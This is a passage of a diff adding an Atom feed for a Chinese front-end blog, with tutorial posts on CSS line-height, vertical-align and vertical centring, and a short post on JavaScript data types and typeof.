class=&quot;name&quot;&gt;em&lt;/span&gt;&amp;gt;&lt;/span&gt;em&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;em&lt;/span&gt;&amp;gt;&lt;/span&gt; 标签。&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;p&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
+&lt;li&gt;content area(内容区域),一种围绕文字看不见的盒子，高度等于font-size大小；&lt;/li&gt;
+&lt;li&gt;inline boxes(内联盒子)，让内容排成一行，包含&lt;code&gt;inline&lt;/code&gt;水平的标签（span, a, em等，例如上面的em)，则属于“内联盒子”; 如果是个光秃秃的文字，则属于“匿名内联盒子”；&lt;/li&gt;
+&lt;li&gt;line boxes(行框盒子)，每一行是一个“行框盒子”，每个“行框盒子”是由一个个“内联盒子”组成；&lt;/li&gt;
+&lt;li&gt;containing box(包含盒子)，&lt;code&gt;&amp;lt;p&amp;gt;&lt;/code&gt;标签所在“包含盒子”，由一行行“行框盒子”(line boxes)组成。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
+&lt;h2 id=&quot;line-height&quot;&gt;&lt;a href=&quot;#line-height&quot; class=&quot;headerlink&quot; title=&quot;line-height&quot;&gt;&lt;/a&gt;line-height&lt;/h2&gt;&lt;p&gt;line-height: 两行文字基线之间的距离，若未定义height，则高度由line-height决定。&lt;/p&gt;
+&lt;p&gt;内容区域高度(content area) + 行间距(vertical spacing) = 行高(line-height)&lt;/p&gt;
+&lt;p&gt;line-height: 1.5/1.5em/150%区别&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;1.5: line-height=1.5*font-size(自己的font-size，父标签算出后，若子标签继承，则需按自己的font-siz重新计算line-height);&lt;/li&gt;
+&lt;li&gt;1.5em/150%: line-height=1.5*font-size(父亲的font-size, 父标签算出后，若子标签继承，则继承父标签的line-height);&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&quot;vertical-align&quot;&gt;&lt;a href=&quot;#vertical-align&quot; class=&quot;headerlink&quot; title=&quot;vertical-align&quot;&gt;&lt;/a&gt;vertical-align&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;/*关键字值*/
+vertical-align: baseline;//(默认)
+vertical-align: sub;
+vertical-align: super;
+vertical-align: text-top;
+vertical-align: text-bottom;
+vertical-align: middle;
+vertical-align: top;
+vertical-align: bottom;
+
+/*&amp;lt;长度&amp;gt;值*/
+vertical-align: 10em;
+vertical-align: 4px;
+
+/*&amp;lt;百分比&amp;gt;值*/
+vertical-align: 10%;
+
+/*全局值*/
+vertical-align: inherit;
+vertical-align: initial;
+vertical-align: unset;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;长度值和百分比值是根据基线(baseline)来移动的，其中百分比是相对line-height的。&lt;/p&gt;
+&lt;div style=&quot;background-color: #e5edff;&quot;&gt;&lt;img src=&quot;/images/test.png&quot; alt=&quot;图片&quot;&gt;&lt;/div&gt;&lt;br&gt;如上图所示，图片下面会有一段空白，why?&lt;br&gt;首先，div里面存在空白节点，相当里面有空文本。这就涉及图片和文本的对齐方式问题。由于&lt;code&gt;vertical-align&lt;/code&gt;的默认值为&lt;code&gt;baseline&lt;/code&gt;，当图片的底端是紧贴父元素的&lt;code&gt;baseline&lt;/code&gt;，而文本呢？它并不是底端紧贴父元素&lt;code&gt;baseline&lt;/code&gt;,而是比&lt;code&gt;baseline&lt;/code&gt;还低，用过英文本子的就知道，英文本子是四线三格，其中第三条线就是&lt;code&gt;baseline&lt;/code&gt;，第三条线到第四条线就是，上面空白的高度。看下面加了文字后就看得更清楚了。&lt;br&gt;&lt;div style=&quot;background-color: #e5edff;&quot;&gt;&lt;img src=&quot;/images/test.png&quot; alt=&quot;图片&quot;&gt;gdh&lt;/div&gt;&lt;br&gt;所以要怎么解决这个问题呢？&lt;br&gt;&lt;br&gt;1. 让vertical-align失效&lt;br&gt;图片默认是&lt;code&gt;inline&lt;/code&gt;水平，而&lt;code&gt;vertical-align&lt;/code&gt;对块状水平元素无感。因此，我们只要让图片&lt;code&gt;display&lt;/code&gt;设为&lt;code&gt;block&lt;/code&gt;就可以了，或者浮动或绝对定位等。例如  &lt;code&gt;img{display: block;}&lt;/code&gt;&lt;br&gt;&lt;div style=&quot;background-color: #e5edff;&quot;&gt;&lt;img src=&quot;/images/test.png&quot; alt=&quot;图片&quot; style=&quot;display:block&quot;&gt;&lt;/div&gt;&lt;br&gt;2. 使用其他vertical-align值&lt;br&gt;使用&lt;code&gt;vertical:bottom/middle/top&lt;/code&gt;等，可使图片(底部/中间/上)分别于文字相应部分对齐，从而不让文本框露出(除非&lt;code&gt;font-size&lt;/code&gt;太大)&lt;br&gt;&lt;div style=&quot;background-color: #e5edff;&quot;&gt;&lt;img src=&quot;/images/test.png&quot; alt=&quot;图片&quot; style=&quot;vertical-align:bottom&quot;&gt;gdh&lt;/div&gt;&lt;br&gt;3. 修改line-height&lt;br&gt;    &lt;code&gt;div{line-height:5px}&lt;/code&gt;&lt;br&gt;&lt;div style=&quot;background-color: #e5edff;line-height:5px;&quot;&gt;&lt;img src=&quot;/images/test.png&quot; alt=&quot;图片&quot;&gt;&lt;span&gt;gdh&lt;/span&gt;&lt;/div&gt;&lt;br&gt;当文本行高足够小时，也可使文本框不溢出，但文字可能溢出&lt;br&gt;4. 修改font-size&lt;br&gt;&lt;code&gt;line-hieght&lt;/code&gt;的值是由&lt;code&gt;font-size&lt;/code&gt;计算出来的，若&lt;code&gt;font-size=0&lt;/code&gt;,则line-height就是0，&lt;br&gt;    &lt;code&gt;div{font-size:0}&lt;/code&gt;&lt;br&gt;&lt;div style=&quot;background-color: #e5edff;font-size:0;&quot;&gt;&lt;img src=&quot;/images/test.png&quot; alt=&quot;图片&quot;&gt;&lt;span&gt;gdh&lt;/span&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;衍生：垂直居中&quot;&gt;&lt;a href=&quot;#衍生：垂直居中&quot; class=&quot;headerlink&quot; title=&quot;衍生：垂直居中&quot;&gt;&lt;/a&gt;衍生：垂直居中&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;&lt;figure class=&quot;highlight html&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;div&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;style&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;background-color: #e5edff; font-size:0; line-height: 240px;&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;img&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;src&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;/images/test.png&quot;&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;alt&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;图片&quot;&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;style&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;vertical-align: middle;&quot;&lt;/span&gt;/&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;div&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;div style=&quot;background-color: #e5edff; font-size:0; line-height: 240px;&quot;&gt;&lt;img src=&quot;/images/test.png&quot; alt=&quot;图片&quot; style=&quot;vertical-align: middle;&quot;&gt;&lt;/div&gt;&lt;br&gt;font-size=0的原因，是middle中线比不是字符内容的绝对居中，不设置会导致并不是真正的垂直居中。&lt;br&gt;t通过&lt;code&gt;line-height&lt;/code&gt;定高，元素&lt;code&gt;vertical-align:middle&lt;/code&gt;垂直居中的方法不仅适用于现代浏览器，连IE7也是支持的。&lt;br&gt;&lt;br&gt;## inline-block和baseline&lt;br&gt;&lt;br&gt;规范：&lt;code&gt;inline-block&lt;/code&gt;元素的若里面没有&lt;code&gt;inlie&lt;/code&gt;内联元素或者&lt;code&gt;overflow&lt;/code&gt;不是visible,则该元素的基线就是margin底边缘，否则，其基线就是元素里面最后一行内联元素的基线。&lt;br&gt;什么意思呢？来看一个例子&lt;br&gt;    &lt;figure class=&quot;highlight html&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;div&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;style&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;display:inline-block; background-color:#e5edff; width:100px; height:100px;&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;div&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;div&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;style&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;display:inline-block; background-color:#e5edff;  width:100px; height:100px;&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;x-baseline&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;div&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;br&gt;&lt;br&gt;&lt;div style=&quot;display:inline-block; background-color:#e5edff; width:100px; height:100px;&quot;&gt;&lt;/div&gt; &lt;div style=&quot;display:inline-block; background-color:#e5edff;  width:100px; height:100px;&quot; onclick=&quot;this.innerHTML=this.innerHTML?&#39;&#39;:&#39;x-baseline&#39;&quot;&gt;x-baseline&lt;/div&gt;
+
+&lt;p&gt;粗看一眼，&lt;code&gt;style&lt;/code&gt;都一样，就是一个有内容，一个没有，为什么有内容的&lt;code&gt;div&lt;/code&gt;掉下去了？&lt;br&gt;其实上面的规范说明了一切，第一个&lt;code&gt;div&lt;/code&gt;没有内容，它的&lt;code&gt;baseline&lt;/code&gt;是容器&lt;code&gt;margin&lt;/code&gt;下边缘，而第二个&lt;code&gt;div&lt;/code&gt;有内容，它的&lt;code&gt;baseline&lt;/code&gt;是x-baseline的基线位置，两者对齐，第二个div不得不掉下去了。&lt;/p&gt;
+&lt;h2 id=&quot;多行文字垂直居中&quot;&gt;&lt;a href=&quot;#多行文字垂直居中&quot; class=&quot;headerlink&quot; title=&quot;多行文字垂直居中&quot;&gt;&lt;/a&gt;多行文字垂直居中&lt;/h2&gt;&lt;div style=&quot;background-color: #e5edff; line-height: 340px; &quot;&gt;&lt;span style=&quot;width: 0; vertical-align: middle; display:inline-block; font-size: 0&quot;&gt;&lt;/span&gt;&lt;span style=&quot;vertical-align:middle; display:inline-block; line-height:1.4em;&quot;&gt;一个inline-block元素，如果里面没有inline内联元素，或者overflow不是visible，则该元素的基线就是其margin底边缘，否则，其基线就是元素里面最后一行内联元素的基线。&lt;/span&gt;&lt;/div&gt;
+
+
+&lt;h2 id=&quot;多图片垂直居中&quot;&gt;&lt;a href=&quot;#多图片垂直居中&quot; class=&quot;headerlink&quot; title=&quot;多图片垂直居中&quot;&gt;&lt;/a&gt;多图片垂直居中&lt;/h2&gt;&lt;p&gt;css&lt;br&gt;    &lt;figure class=&quot;highlight css&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;selector-tag&quot;&gt;ul&lt;/span&gt;&amp;#123;&lt;span class=&quot;attribute&quot;&gt;overflow&lt;/span&gt;: hidden; &lt;span class=&quot;attribute&quot;&gt;zoom&lt;/span&gt;: &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;selector-tag&quot;&gt;ul&lt;/span&gt;&amp;gt;&lt;span class=&quot;selector-tag&quot;&gt;li&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;attribute&quot;&gt;list-style&lt;/span&gt;: none;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;attribute&quot;&gt;line-height&lt;/span&gt;: &lt;span class=&quot;number&quot;&gt;140px&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;attribute&quot;&gt;width&lt;/span&gt;: &lt;span class=&quot;number&quot;&gt;200px&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;attribute&quot;&gt;text-align&lt;/span&gt;: center;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;attribute&quot;&gt;float&lt;/span&gt;: left;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;attribute&quot;&gt;border&lt;/span&gt;: &lt;span class=&quot;number&quot;&gt;1px&lt;/span&gt; solid red; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;selector-tag&quot;&gt;ul&lt;/span&gt;&amp;gt;&lt;span class=&quot;selector-tag&quot;&gt;li&lt;/span&gt; &lt;span class=&quot;selector-tag&quot;&gt;img&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;attribute&quot;&gt;vertical-align&lt;/span&gt;: middle;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;selector-tag&quot;&gt;ul&lt;/span&gt;&amp;gt;&lt;span class=&quot;selector-tag&quot;&gt;li&lt;/span&gt;&lt;span class=&quot;selector-pseudo&quot;&gt;:after&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;attribute&quot;&gt;content&lt;/span&gt;: &lt;span class=&quot;string&quot;&gt;&quot;&quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;attribute&quot;&gt;font-size&lt;/span&gt;: &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;attribute&quot;&gt;vertical-align&lt;/span&gt;: middle;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;html&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&lt;figure class=&quot;highlight html&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;ul&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;li&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;img&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;src&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;./images/test.png&quot;&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;alt&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;&quot;&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;style&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;width: 50px&quot;&lt;/span&gt; /&amp;gt;&lt;/span&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;li&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;li&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;img&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;src&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;./images/test.png&quot;&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;alt&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;&quot;&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;style&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;width: 60px&quot;&lt;/span&gt;/&amp;gt;&lt;/span&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;li&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;li&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;img&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;src&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;./images/test.png&quot;&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;alt&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;&quot;&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;style&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;width: 100px&quot;&lt;/span&gt;/&amp;gt;&lt;/span&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;li&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;li&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;img&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;src&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;./images/test.png&quot;&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;alt&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;&quot;&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;style&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;width: 120px&quot;&lt;/span&gt;/&amp;gt;&lt;/span&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;li&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;ul&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;iframe src=&quot;/image-center.html&quot; style=&quot;height:200px; width: 100%&quot;&gt;&lt;/iframe&gt;
+</content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;本文基本来自张鑫旭的&lt;a href=&quot;http://www.zhangxinxu.com/wordpress/2015/08/css-deep-understand-vertical-align-and-line-height/&quot;&gt;博客&lt;/a&gt;，自己简写了许多。&lt;/p&gt;
+&lt;h1 id=&quot;line-height和vertical-aline&quot;&gt;&lt;a href=&quot;#line-height和vertical-aline&quot; class=&quot;headerlink&quot; title=&quot;line-height和vertical-aline&quot;&gt;&lt;/a&gt;line-height和vertical-aline&lt;/h1&gt;&lt;h2 id=&quot;行内框盒子模型&quot;&gt;&lt;a href=&quot;#行内框盒子模型&quot; class=&quot;headerlink&quot; title=&quot;行内框盒子模型&quot;&gt;&lt;/a&gt;行内框盒子模型&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;&lt;figure class=&quot;highlight html&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;p&lt;/span&gt;&amp;gt;&lt;/span&gt;这是一行普通的文字，这里有个 &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;em&lt;/span&gt;&amp;gt;&lt;/span&gt;em&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;em&lt;/span&gt;&amp;gt;&lt;/span&gt; 标签。&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;p&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
+&lt;li&gt;content area(内容区域),一种围绕文字看不见的盒子，高度等于font-size大小；&lt;/li&gt;
+&lt;li&gt;inline boxes(内联盒子)，让内容排成一行，包含&lt;code&gt;inline&lt;/code&gt;水平的标签（span, a, em等，例如上面的em)，则属于“内联盒子”; 如果是个光秃秃的文字，则属于“匿名内联盒子”；&lt;/li&gt;
+&lt;li&gt;line boxes(行框盒子)，每一行是一个“行框盒子”，每个“行框盒子”是由一个个“内联盒子”组成；&lt;/li&gt;
+&lt;li&gt;containing box(包含盒子)，&lt;code&gt;&amp;lt;p&amp;gt;&lt;/code&gt;标签所在“包含盒子”，由一行行“行框盒子”(line boxes)组成。&lt;/li&gt;
+&lt;/ul&gt;
+    
+    </summary>
+    
+    
+      <category term="CSS" scheme="http://yoursite.com/tags/CSS/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>js数据类型和typeof</title>
+    <link href="http://yoursite.com/2016/05/13/js%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%E5%92%8Ctypeof/"/>
+    <id>http://yoursite.com/2016/05/13/js数据类型和typeof/</id>
+    <published>2016-05-13T07:20:32.000Z</published>
+    <updated>2016-05-14T15:07:43.451Z</updated>
+    
+    <content type="html">&lt;h2 id=&quot;JS基本数据类型-简单数据类型&quot;&gt;&lt;a href=&quot;#JS基本数据类型-简单数据类型&quot; class=&quot;headerlink&quot; title=&quot;JS基本数据类型(简单数据类型)&quot;&gt;&lt;/a&gt;JS基本数据类型(简单数据类型)&lt;/h2&gt;&lt;p&gt;Undefined Null String Number Boolean&lt;/p&gt;
+&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
+&lt;h2 id=&quot;JS复杂数据类型&quot;&gt;&lt;a href=&quot;#JS复杂数据类型&quot; class=&quot;headerlink&quot; title=&quot;JS复杂数据类型&quot;&gt;&lt;/a&gt;JS复杂数据类型&lt;/h2&gt;&lt;p&gt;Object&lt;/p&gt;
+&lt;h2 id=&quot;typeof&quot;&gt;&lt;a href=&quot;#typeof&quot; class=&quot;headerlink&quot; title=&quot;typeof&quot;&gt;&lt;/a&gt;typeof&lt;/h2&gt;&lt;ul&gt;
+&lt;li&gt;“string”——字符串，非字符串对象；&lt;/li&gt;
+&lt;li&gt;“object”——对象和null；&lt;/li&gt;
+&lt;li&gt;“number”——数值；&lt;/li&gt;
+&lt;li&gt;“undefined”——未定义；&lt;/li&gt;
+&lt;li&gt;“function”——函数；&lt;/li&gt;
+&lt;li&gt;“boolean”——布尔值。&lt;/li&gt;
+&lt;/ul&gt;
+</content>
+    
+    <summary type="html">
+    
+      &lt;h2 id=&quot;JS基本数据类型-简单数据类型&quot;&gt;&lt;a href=&quot;#JS基本数据类型-简单数据类型&quot; class=&quot;headerlink&quot; title=&quot;JS基本数据类型(简单数据类型)&quot;&gt;&lt;/a&gt;JS基本数据类型(简单数据类型)&lt;/h2&gt;&lt;p&gt;Undefined Null String Number Boolean&lt;/p&gt;
+    
+    </summary>
+    
+    
+      <category term="JS" scheme="http://yoursite.com/tags/JS/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>跨文档消息传递</title>
